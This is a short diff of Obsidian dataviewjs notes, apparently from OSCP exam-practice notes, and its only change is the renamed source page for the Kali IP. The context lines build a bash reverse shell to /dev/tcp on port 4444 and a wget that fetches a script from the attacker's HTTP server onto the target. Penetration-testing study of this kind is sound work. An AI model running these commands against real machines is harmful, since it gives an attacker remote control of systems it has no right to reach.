@@ -82,7 +82,7 @@ MOSH_KEY=RmYsRZ1ch9feXBDfpY53jA mosh-client 127.0.0.1 60013
 /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py
 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `echo "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1" > /tmp/shell.sh`;
 
@@ -156,7 +156,7 @@ python3 -m http.server 8080
 
 On Target machine
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `sudo wget ${KaliIP}:8080/writeup.sh -O /root/troll`;
 
